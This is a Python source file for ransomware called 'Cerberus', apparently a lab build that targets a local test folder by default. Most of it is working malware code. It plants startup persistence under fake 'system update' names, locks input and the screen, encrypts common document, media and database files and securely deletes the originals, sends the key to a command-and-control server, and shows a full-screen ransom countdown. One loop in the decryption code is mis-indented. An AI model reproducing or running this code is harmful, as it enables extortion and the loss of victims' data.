# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import socket
import shutil
import subprocess
import random 
import ctypes
from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage, Text, Scrollbar
from tkinter import font as tkfont
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

# --- Persistence Utilities ---
def install_persistence():
    """Installs the ransomware to run on startup using absolute paths."""
    try:
        # Determine the absolute path of the executable/script
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
            
        executable = sys.executable

        if os.name == 'nt':
            import winreg
            # Windows Persistence: HKCU Run Key
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                # Use a stealthy name like "WindowsSystemUpdate"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                # Command: "python.exe" "C:\path\to\ransomware.py"
                cmd = f'"{executable}" "{app_path}"' if not getattr(sys, 'frozen', False) else f'"{app_path}"'
                winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(key)
                log_error("Windows persistence installed.")
            except Exception as e:
                log_error(f"Windows persistence failed: {e}")
        else:
            # Linux Persistence: XDG Autostart
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"[Desktop Entry]\n")
                f.write(f"Type=Application\n")
                f.write(f"Name=System Critical Update\n")
                # Command: /usr/bin/python3 /path/to/ransomware.py
                cmd = f"{executable} {app_path}"
                f.write(f"Exec={cmd}\n")
                f.write(f"Terminal=false\n")
                f.write(f"X-GNOME-Autostart-enabled=true\n")
            
            subprocess.run(['chmod', '+x', desktop_file])
            log_error(f"Linux persistence installed at {desktop_file}")
            
    except Exception as e:
        log_error(f"Persistence installation failed: {e}")

def remove_persistence():
    """Removes the persistence mechanism."""
    try:
        if os.name == 'nt':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSystemUpdate")
                winreg.CloseKey(key)
                log_error("Windows persistence removed.")
            except Exception as e:
                pass # Key might not exist
        else:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
            if os.path.exists(desktop_file):
                os.remove(desktop_file)
                log_error("Linux persistence removed.")
    except Exception as e:
        log_error(f"Persistence removal failed: {e}")

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
TARGET_DIRECTORY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_data")
LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQ42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- System Lockdown Utilities ---
def lock_system():
    """
    locks the system by disabling input and hiding UI elements.
    Cross-platform compatibility for Windows and Linux (Kali).
    """
    if os.name == 'nt':
        try:
            ctypes.windll.user32.BlockInput(True)
            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.user32.SystemParametersInfoW(97, 0, 1, 0)
        except Exception as e:
            log_error(f"Windows lock failed: {e}")
    else:
        try:
            subprocess.run(['xset', 's', 'off'], check=False)
            subprocess.run(['xset', '-dpms'], check=False)
        except Exception as e:
            log_error(f"Linux lock failed: {e}")

def hide_console():
    """Hides the console window on Windows. On Linux, we rely on the GUI covering it."""
    if os.name == 'nt':
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            log_error(f"Failed to hide console: {e}")

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=1): 
    try:
        if os.path.exists(file_path):
            with open(file_path, "ba+") as f:
                length = f.tell()
            with open(file_path, "r+b") as f:
                f.write(os.urandom(length))
            os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass 

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)
        log_error(f"Created target directory: {TARGET_DIRECTORY}")

    # Check safe persistence: if key backup exists, we might have crashed.
    if os.path.exists(KEY_BACKUP_FILE):
        log_error("Found key backup. Resuming from crash...")
        try:
            with open(KEY_BACKUP_FILE, 'rb') as f:
                return f.read()
        except:
            pass 

    # Normal lock check
    if os.path.exists(LOCK_FILE):
        log_error("Encryption seemingly complete (Lock file exists).")
        return None

    aes_key = generate_aes_key()
    
    # SAFETY: Check if we are running on an already infected system (failed state recovery)
    # Scan a few files to see if they are encrypted
    already_encrypted_count = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            if file.endswith(ENCRYPTED_EXTENSION):
                already_encrypted_count += 1
    
    if already_encrypted_count > 5:
        log_error("Aborting encryption: System appears already encrypted but ID file is missing.")
        # We can't recover the key if backup is gone too. This is a dead state.
        # But better to stop than to double encrypt or confuse the user with a new ID.
        return None

    # SAFETY: Backup key immediately!
    try:
        with open(KEY_BACKUP_FILE, 'wb') as f:
            f.write(aes_key)
    except Exception as e:
        log_error(f"Failed to write key backup: {e}")

    encrypted_files = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                if encrypt_file_aes_gcm(file_path, aes_key):
                    secure_delete_file(file_path)
                    encrypted_files += 1

    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key, encrypted_files

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        # Try to connect, with retries
        victim_id = None
        for _ in range(3):
            try:
                response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=5)
                if response.status_code == 200:
                    victim_id = response.json().get('victim_id')
                    break
            except:
                time.sleep(2)
        
        if not victim_id:
            raise Exception("Failed to connect to C2 after retries.")

        # PERSISTENCE: Save Victim ID
        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
        
        # CLEANUP: Delete backup key only after successful ID save
        if os.path.exists(KEY_BACKUP_FILE):
            os.remove(KEY_BACKUP_FILE)
            
        log_error(f"Successfully checked in. Victim ID: {victim_id}")
        return victim_id
    except Exception as e:
        log_error(f"C2 check-in failed: {e}")
        return None

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id, encrypted_count=0):
        self.master = master
        self.victim_id = victim_id
        self.payment_received = False
        self.already_decrypted = False
        self.encrypted_count = encrypted_count
        self.time_left = 72 * 3600 

        # --- GUI Configuration ---
        master.title("RANSOMWARE")
        master.configure(bg='black')
        master.attributes('-fullscreen', True)
        master.attributes('-topmost', True) 
        master.overrideredirect(True) 
        master.resizable(False, False)
        
        # Lock Input
        master.wait_visibility(master)
        try:
            master.grab_set_global()
        except:
            master.grab_set()
        master.focus_force()

        # Disable shortcuts
        def safe_bind(sequence, func):
            try:
                master.bind(sequence, func)
            except Exception:
                pass
        safe_bind('<Escape>', lambda e: None)
        safe_bind('<Control-w>', lambda e: None)
        safe_bind('<Alt-Tab>', lambda e: None)
        master.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Aggressive Loop
        self.force_focus_loop()

        # --- Visuals ---
        self.message = Label(master, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Arial", 24, "bold"))
        self.message.pack(pady=20)
        
        self.victim_id_l = Label(master, text=f"YOUR VICTIM ID IS: {victim_id}", fg="green", bg="black", font=("Arial", 16))
        self.victim_id_l.pack(pady=10)
        
        self.timer_label = Label(master, text="TIME REMAINING: 72:00:00", fg="red", bg="black", font=("Courier", 20, "bold"))
        self.timer_label.pack(pady=10)
        
        # Activity Log
        log_frame = Frame(master, bg="black")
        log_frame.pack(pady=10, fill="both", expand=True)
        self.log_text = Text(log_frame, height=8, bg="#1a1a1a", fg="#00ff00", font=("Consolas", 10), state="disabled")
        scrollbar = Scrollbar(log_frame, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar.set)
        self.log_text.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        self.populate_log_initial()

        self.payment_status = Label(master, text="Payment not detected. Do not close this window.", fg="white", bg="black", font=("Arial", 14))
        self.payment_status.pack(pady=10)
        
        self.decrypt_button = Button(master, text="DECRYPT FILES", state="disabled", bg="red", fg="white", font=("Arial", 16), command=self.start_decryption)
        self.decrypt_button.pack(pady=20)

        self.key_var = StringVar()
        
        self.heartbeat_thread_running = True
        threading.Thread(target=self.heartbeat_polling, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()
        
        # Attempt visual effects
        self.master.after(2000, self.change_wallpaper)

    def populate_log_initial(self):
        self.log_message("SYSTEM COMPROMISED.", "red")
        if self.encrypted_count > 0:
            self.log_message(f"Encrypted {self.encrypted_count} files.", "red")
        else:
            self.log_message("Files encrypted in previous session.", "red")

    def log_message(self, message, color):
        try:
            self.log_text.config(state="normal")
            self.log_text.insert("end", f"[{time.strftime('%H:%M:%S')}] {message}\n", color)
            self.log_text.tag_config(color, foreground=color)
            self.log_text.see("end")
            self.log_text.config(state="disabled")
        except: pass

    def update_timer(self):
        while self.heartbeat_thread_running and self.time_left > 0:
            time.sleep(1)
            self.time_left -= 1
            hours, remainder = divmod(self.time_left, 3600)
            minutes, seconds = divmod(remainder, 60)
            try:
                self.timer_label.config(text=f"TIME REMAINING: {hours:02}:{minutes:02}:{seconds:02}")
            except: pass

    def force_focus_loop(self):
        try:
            self.master.lift()
            self.master.attributes('-topmost', True)
            self.master.focus_force()
            try: self.master.grab_set_global() 
            except: self.master.grab_set()
        except: pass
        self.master.after(50, self.force_focus_loop)

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                # Sync Timer
                payload = {"time_left": self.time_left}
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", json=payload, timeout=5)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # Update local timer if server differs significantly
                    server_timer = data.get("server_timer")
                    if server_timer is not None and abs(self.time_left - server_timer) > 10:
                        self.time_left = server_timer

                    # Check Payment
                    if data.get("status") == "ready" and data.get("key"):
                        self.payment_received = True
                        self.key_var.set(data.get("key"))
                    
                    self.master.after(0, self.update_ui_state)
            except:
                pass
            time.sleep(5) 
            
    def update_ui_state(self):
        if self.payment_received and not self.already_decrypted:
            self.show_decryption_complete_message()
        else:
            self.show_payment_required_message()

    def show_decryption_complete_message(self):
        self.payment_status.config(text="Payment Received. Decryption Enabled.", fg="green")
        self.decrypt_button.config(state="normal", bg="green")

    def show_payment_required_message(self):
        self.payment_status.config(text="Payment not detected. Do not close this window.", fg="white")
        self.decrypt_button.config(state="disabled", bg="red")

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64: return
        
        self.log_message("KEY RECEIVED. STARTING DECRYPTION...", "green")
        
        def decrypt_process():
            try:
                key = base64.b64decode(key_b64)
                decrypted_files = 0
                for root, _, files in os.walk(TARGET_DIRECTORY):
                    for file in files:
                            if file.endswith(ENCRYPTED_EXTENSION):
                            file_path = os.path.join(root, file)
                            if decrypt_file_aes_gcm(file_path, key):
                                decrypted_files += 1
                                self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
                                time.sleep(0.05)
                
                # Cleanup moved to finish_decryption to prevent data loss on crash
                
                self.master.after(0, self.finish_decryption, decrypted_files)
            except Exception as e:
                log_error(f"Decryption failed: {e}")
                self.master.after(0, lambda: self.payment_status.config(text=f"ERROR: {str(e)}", fg='red'))

        threading.Thread(target=decrypt_process, daemon=True).start()

    def finish_decryption(self, count):
        self.payment_status.config(text=f"SUCCESS! {count} files decrypted.", fg='green')
        self.heartbeat_thread_running = False
        self.decrypt_button.config(state='disabled')
        self.already_decrypted = True 
        self.log_message("SYSTEM RESTORED.", "green")
        
        # FINAL CLEANUP
        if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
        if os.path.exists(ID_FILE): os.remove(ID_FILE)
        if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
        remove_persistence()

        # Quit after delay
        self.master.after(5000, self.force_quit)

    def force_quit(self):
        self.master.grab_release() 
        self.master.destroy()
        sys.exit()

    def change_wallpaper(self):
        # Placeholder
        pass
        
    def audio_loop(self):
        pass

# --- Main Execution ---
if __name__ == "__main__":
    # 0. Persistence Installation
    install_persistence()

    hide_console()
    lock_system() 

    # 1. Recovery Check (ID exists?)
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id, encrypted_count=0) # Resume
                root.mainloop()
                sys.exit()
        except:
            pass 

    # 2. New Infection
    result = encrypt_directory()
    
    if result is not None:
         if isinstance(result, tuple):
             aes_key, encrypted_count = result
         else:
             aes_key = result
             encrypted_count = 0 
    else:
        aes_key = None

    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            root = Tk()
            app = RansomwareGUI(root, victim_id, encrypted_count)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        log_error("Encryption skipped or failed. Aborting.")
